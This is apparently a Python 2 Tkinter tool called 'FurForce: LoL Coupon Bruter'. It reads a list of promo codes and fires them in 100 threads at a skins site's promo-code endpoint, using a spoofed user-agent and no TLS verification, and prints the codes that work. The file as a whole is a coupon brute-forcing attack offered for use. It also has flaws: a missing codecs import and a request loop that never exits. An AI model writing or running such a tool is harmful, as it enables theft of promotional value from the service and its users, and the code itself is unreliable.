# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import concurrent.futures
import requests
import requests.exceptions
import sys
import uuid
import Tkinter as Tk
from tkFileDialog import askopenfilename


class App():
    def __init__(self, parent):

        # Check To See If You Purchased c:
        # self.ownercheck()

        # Check To See If There's An Update
        # self.updatecheck()

        # Setup Window
        self.window = parent
        self.window.title('FurForce: LoL Coupon Bruter')

        # Set Variables
        self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
        self.combos = Tk.StringVar(self.window)

        # Make Widgets
        self.labelcodes = Tk.Label(self.window, text="Coupon List: ")
        self.entrycodes = Tk.Entry(self.window, textvariable=self.combos)
        self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)
        self.codesbutton = Tk.Button(self.window, text="Open Coupon File!", command=self.setcombos)

        # Grid Widgets
        self.labelcodes.grid(row=0, column=0, sticky=Tk.W)
        self.entrycodes.grid(row=0, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.codesbutton.grid(row=0, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.startbutton.grid(row=1, column=0, columnspan=6, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

    def ownercheck(self):
        r = requests.get('http://coinsgo.in/spotify.php?hwid={0}'.format(str(uuid.getnode())),
                         proxies={})
        if 'truelikeurmumspot' in r.text:
            print "You own this c:!"
        else:
            print "You do not own this. Please go away :c!"
            sys.exit("ur poop")

    def updatecheck(self):
        r = requests.get('http://coinsgo.in/version.xml',
                         proxies={})
        if '1.0.0.0' in r.text:
            print "Up to date!"
        else:
            print "Please visit http://coinsgo.in/ to update"

    def trycode(self, code):
        global work
        work = True
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
        }
        while work:
            try:
                response = requests.get(
                    'http://www.aceskins.net/forms/jsPromoCode.php?code={0}&type=Starter%20Bundle%20NA%20x1'
                    ''.format(code),
                    timeout=7.5,
                    headers=headers,
                    verify=False
                )
                if not '0+add' in response.text:
                    print code
            except requests.exceptions.HTTPError:
                print "HTTP Error!"
                work = True
            except requests.exceptions.ConnectionError:
                print "Connection Error!"
                work = True
            except requests.exceptions.Timeout:
                print "Timeout Error!"
                work = True

    def start(self):
        if self.entrycodes.get() == '':
            print 'You didn\'t add any combos!'
        else:
            with codecs.open(self.entrycodes.get(), 'r') as f:
                global codes
                codes = f.readlines()
                f.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as x:
            for code in codes:
                x.submit(self.trycode, code)

    def setcombos(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.combos.set(filename)

if __name__ == "__main__":
    root = Tk.Tk()
    app = App(root)
    root.mainloop()